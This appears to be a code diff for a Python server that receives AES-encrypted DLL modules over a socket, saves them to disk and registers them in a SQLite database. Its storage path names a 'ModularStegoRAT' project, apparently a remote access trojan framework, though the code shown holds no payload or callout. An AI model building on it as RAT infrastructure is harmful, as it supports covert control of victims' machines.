@@ -1,7 +1,9 @@
+import os
 import json
 import base64
 import socket
 import sqlite3
+from datetime import datetime, timezone
 from passlib.hash import argon2# type:ignore
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
@@ -14,6 +16,7 @@ DATABASE_NAME = "ModuleDatabase.db"
 INCOMING_CONNECTION_HOST = "127.0.0.1"
 INCOMING_CONNECTION_PORT = 12345
 NUM_BYTES_PER_MODULE = 0 #TODO : Consider 3 instead - 2 provides 65536 which may not be highly scalable
+MODULE_STORAGE = "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Database Module Storage"
 
 def IncrementNonce(oldNonce : bytes, increment : int) -> bytes:
     oldNonceInt = int.from_bytes(oldNonce, byteorder="big")
@@ -134,7 +137,7 @@ def HandleClient(clientSocket : socket.socket):
         password = aes.decrypt(IncrementNonce(seedNonce, 4), base64.b64decode(request["Password"]), None).decode()
         publicKeyBytes = aes.decrypt(IncrementNonce(seedNonce, 5), base64.b64decode(request["Public Key"]), None)
         dllSize = int(aes.decrypt(IncrementNonce(seedNonce, 6), base64.b64decode(request["DLL Size"]), None).decode())
-        dependencies = json.loads(aes.decrypt(IncrementNonce(seedNonce, 7), base64.b64decode(request["Dependencies"]), None).decode())
+        dependencies = aes.decrypt(IncrementNonce(seedNonce, 7), base64.b64decode(request["Dependencies"]), None).decode()
 
         #Check 1 - Does this user alr exist?
         userExists = True
@@ -160,10 +163,16 @@ def HandleClient(clientSocket : socket.socket):
         
         #Check 3 - do we have a spare moduleID ie have we gone past the limit?
         freeID = True
+        newModuleID = -1
         cursor.execute("SELECT MAX(moduleID) FROM modules")
         lastModuleID = cursor.fetchone()[0]
         if(lastModuleID == (2**NUM_BYTES_PER_MODULE - 1)):
             freeID = False
+        
+        if(lastModuleID != None):
+            newModuleID = lastModuleID + 1
+        else:
+            newModuleID = 0 
 
         #Sending our info response
         responseMarker = "ACCEPTED" if (userExists and moduleUnique and freeID) else "DENIED"
@@ -176,6 +185,63 @@ def HandleClient(clientSocket : socket.socket):
 
         responseEncrypted = aes.encrypt(IncrementNonce(seedNonce, 8), response, None)
         clientSocket.send(responseEncrypted.ljust(1024, b"\0"))
+        
+        if(responseMarker == "ACCEPTED"):
+            seedNonceIncrement = 9
+            try:
+                amountToRecv = dllSize
+                with open(os.path.join(MODULE_STORAGE, str(newModuleID) + ".dll"), "wb") as f:
+                    while amountToRecv > 0:
+                        
+                        print(min(amountToRecv, 65536) + 16)
+                        print(int.from_bytes(seedNonce))
+                    
+                        chunk = aes.decrypt(IncrementNonce(seedNonce, seedNonceIncrement), clientSocket.recv(min(amountToRecv, 65536) + 16), None)
+                        f.write(chunk)
+                        amountToRecv -= len(chunk)
+                        seedNonceIncrement += 1
+            
+                #Writing into database
+                cursor.execute("""
+                    INSERT INTO modules (
+                        moduleID,
+                        moduleName,
+                        moduleOwnerUsername,
+                        moduleDLLPath,
+                        moduleVersion,
+                        moduleDescription,
+                        moduleLastEdited,
+                        dependencies
+                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+                """,
+                (
+                    newModuleID,
+                    moduleName,
+                    username,
+                    os.path.join(MODULE_STORAGE, str(newModuleID) + ".dll"),
+                    1,
+                    moduleDescription,
+                    datetime.now(timezone.utc).strftime("%Y-%m-%d-%H-%M-%S"),
+                    dependencies
+                ))
+                conn.commit()
+            
+                response = json.dumps({
+                    "Transmission Status" : "SUCCESS",
+                    "Module ID" : newModuleID 
+                })
+                
+            except Exception as e:
+                response = json.dumps({
+                    "Transmission Status" : "FAILURE",
+                    "Reason" : str(e)
+                })
+                
+            responseEncrypted = aes.encrypt(IncrementNonce(seedNonce, seedNonceIncrement), response.encode(), None)
+            clientSocket.send(responseEncrypted.ljust(1024, b"\0"))
+            
+        clientSocket.shutdown(socket.SHUT_RDWR)
+        clientSocket.close()      
 
 #Accept users
 incomingConnectionSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
